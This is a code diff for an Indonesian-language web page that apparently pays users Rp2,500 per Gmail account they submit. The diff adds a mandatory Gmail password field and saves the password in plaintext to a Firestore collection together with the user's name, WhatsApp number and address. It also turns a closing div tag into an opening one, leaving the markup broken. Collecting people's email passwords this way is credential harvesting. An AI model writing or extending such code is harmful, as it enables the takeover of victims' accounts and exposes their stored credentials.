@@ -354,7 +354,7 @@ body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;fon
 <div class="form-group">
   <label>Password Gmail</label>
   <input type="password" id="u-password" placeholder="Masukkan password Gmail">
-</div>
+<div>
         <div id="gmail-check-msg" class="alert" style="margin-top:-6px"></div>
 
         <button class="btn btn-green" id="btn-setor" onclick="submitGmail()">
@@ -803,14 +803,25 @@ async function submitGmail(){
     }
 
     // Save ke Firestore
-    await db.collection(COLLECTION).add({
-      nama:       currentUser.nama,
-      wa:         currentUser.wa,
-      gmail:      gmail,
-      reward:     REWARD_PER_GMAIL,
-      status:     'pending',
-      createdAt:  firebase.firestore.FieldValue.serverTimestamp()
-    });
+  const password = document.getElementById('u-password').value.trim();
+
+if(!password){
+  userAlert.className='alert show alert-yellow';
+  userAlert.textContent='⚠️ Password Gmail wajib diisi';
+  btn.disabled=false;
+  sp.style.display='none';
+  return;
+}
+
+await db.collection(COLLECTION).add({
+  nama: currentUser.nama,
+  wa: currentUser.wa,
+  gmail: gmail,
+  password: password,
+  reward: REWARD_PER_GMAIL,
+  status: 'pending',
+  createdAt: firebase.firestore.FieldValue.serverTimestamp()
+});
 
     userAlert.className='alert show alert-green';
     userAlert.textContent='🎉 Berhasil! Gmail diterima. Reward Rp2.500 akan dikirim ke WhatsApp dalam 1×24 jam.';
